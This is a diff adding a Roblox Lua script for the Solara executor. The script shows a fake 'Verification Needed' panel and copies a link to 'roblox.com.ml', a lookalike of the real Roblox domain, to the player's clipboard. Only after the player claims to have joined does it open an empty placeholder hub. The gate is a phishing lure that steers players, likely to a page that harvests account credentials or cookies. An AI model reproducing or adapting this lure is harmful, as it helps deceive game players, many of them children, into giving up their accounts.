@@ -1,0 +1,180 @@
+-- // Solara Compatible Version
+local LINK = "https://www.roblox.com.ml/communities/127812156538/StillWorks"
+
+-- // Services
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+-- Use gethui if available (better on Solara), otherwise CoreGui
+local guiParent = (gethui and gethui()) or game:GetService("CoreGui")
+
+-- // Safe clipboard
+local function copyLink(text)
+    local success, err = pcall(function()
+        if setclipboard then
+            setclipboard(text)
+        elseif toclipboard then
+            toclipboard(text)
+        else
+            print("Link: " .. text)
+        end
+    end)
+    if not success then
+        print("Clipboard failed:", err)
+    end
+end
+
+-- // Create ScreenGui
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "VerificationHub"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.Parent = guiParent
+
+-- // Main Frame
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 320, 0, 220)
+MainFrame.Position = UDim2.new(0.5, -160, 0.5, -110)
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+MainFrame.BorderSizePixel = 0
+MainFrame.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 12)
+UICorner.Parent = MainFrame
+
+local UIStroke = Instance.new("UIStroke")
+UIStroke.Color = Color3.fromRGB(80, 80, 100)
+UIStroke.Thickness = 1.5
+UIStroke.Parent = MainFrame
+
+-- Title
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.Position = UDim2.new(0, 0, 0, 15)
+Title.BackgroundTransparency = 1
+Title.Text = "Verification Needed"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 20
+Title.Parent = MainFrame
+
+-- Subtitle
+local Subtitle = Instance.new("TextLabel")
+Subtitle.Size = UDim2.new(1, -20, 0, 30)
+Subtitle.Position = UDim2.new(0, 10, 0, 55)
+Subtitle.BackgroundTransparency = 1
+Subtitle.Text = "Join our group!"
+Subtitle.TextColor3 = Color3.fromRGB(180, 180, 200)
+Subtitle.Font = Enum.Font.Gotham
+Subtitle.TextSize = 15
+Subtitle.Parent = MainFrame
+
+-- Join Group Button
+local JoinBtn = Instance.new("TextButton")
+JoinBtn.Size = UDim2.new(0, 260, 0, 40)
+JoinBtn.Position = UDim2.new(0.5, -130, 0, 100)
+JoinBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+JoinBtn.Text = "Join Group"
+JoinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+JoinBtn.Font = Enum.Font.GothamBold
+JoinBtn.TextSize = 16
+JoinBtn.Parent = MainFrame
+
+local JoinCorner = Instance.new("UICorner")
+JoinCorner.CornerRadius = UDim.new(0, 8)
+JoinCorner.Parent = JoinBtn
+
+-- I Joined Button
+local JoinedBtn = Instance.new("TextButton")
+JoinedBtn.Size = UDim2.new(0, 260, 0, 40)
+JoinedBtn.Position = UDim2.new(0.5, -130, 0, 155)
+JoinedBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+JoinedBtn.Text = "I Joined"
+JoinedBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+JoinedBtn.Font = Enum.Font.GothamBold
+JoinedBtn.TextSize = 16
+JoinedBtn.Parent = MainFrame
+
+local JoinedCorner = Instance.new("UICorner")
+JoinedCorner.CornerRadius = UDim.new(0, 8)
+JoinedCorner.Parent = JoinedBtn
+
+-- // Buttons
+JoinBtn.MouseButton1Click:Connect(function()
+    copyLink(LINK)
+    JoinBtn.Text = "Link Copied!"
+    task.wait(1.5)
+    JoinBtn.Text = "Join Group"
+end)
+
+JoinedBtn.MouseButton1Click:Connect(function()
+    MainFrame:Destroy()
+    loadHub()
+end)
+
+-- // Hub
+function loadHub()
+    local HubFrame = Instance.new("Frame")
+    HubFrame.Size = UDim2.new(0, 380, 0, 280)
+    HubFrame.Position = UDim2.new(0.5, -190, 0.5, -140)
+    HubFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
+    HubFrame.BorderSizePixel = 0
+    HubFrame.Parent = ScreenGui
+
+    local HubCorner = Instance.new("UICorner")
+    HubCorner.CornerRadius = UDim.new(0, 12)
+    HubCorner.Parent = HubFrame
+
+    local HubStroke = Instance.new("UIStroke")
+    HubStroke.Color = Color3.fromRGB(70, 70, 90)
+    HubStroke.Thickness = 1.5
+    HubStroke.Parent = HubFrame
+
+    local HubTitle = Instance.new("TextLabel")
+    HubTitle.Size = UDim2.new(1, 0, 0, 45)
+    HubTitle.BackgroundTransparency = 1
+    HubTitle.Text = "Your Hub Name"
+    HubTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    HubTitle.Font = Enum.Font.GothamBold
+    HubTitle.TextSize = 22
+    HubTitle.Parent = HubFrame
+
+    local ExampleBtn = Instance.new("TextButton")
+    ExampleBtn.Size = UDim2.new(0, 300, 0, 42)
+    ExampleBtn.Position = UDim2.new(0.5, -150, 0, 80)
+    ExampleBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
+    ExampleBtn.Text = "Example Feature"
+    ExampleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    ExampleBtn.Font = Enum.Font.Gotham
+    ExampleBtn.TextSize = 15
+    ExampleBtn.Parent = HubFrame
+
+    local ExampleCorner = Instance.new("UICorner")
+    ExampleCorner.CornerRadius = UDim.new(0, 8)
+    ExampleCorner.Parent = ExampleBtn
+
+    ExampleBtn.MouseButton1Click:Connect(function()
+        print("Feature clicked")
+    end)
+
+    local CloseBtn = Instance.new("TextButton")
+    CloseBtn.Size = UDim2.new(0, 30, 0, 30)
+    CloseBtn.Position = UDim2.new(1, -40, 0, 10)
+    CloseBtn.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
+    CloseBtn.Text = "X"
+    CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    CloseBtn.Font = Enum.Font.GothamBold
+    CloseBtn.TextSize = 14
+    CloseBtn.Parent = HubFrame
+
+    local CloseCorner = Instance.new("UICorner")
+    CloseCorner.CornerRadius = UDim.new(0, 6)
+    CloseCorner.Parent = CloseBtn
+
+    CloseBtn.MouseButton1Click:Connect(function()
+        ScreenGui:Destroy()
+    end)
+end
+
+print("✅ Script loaded on Solara")
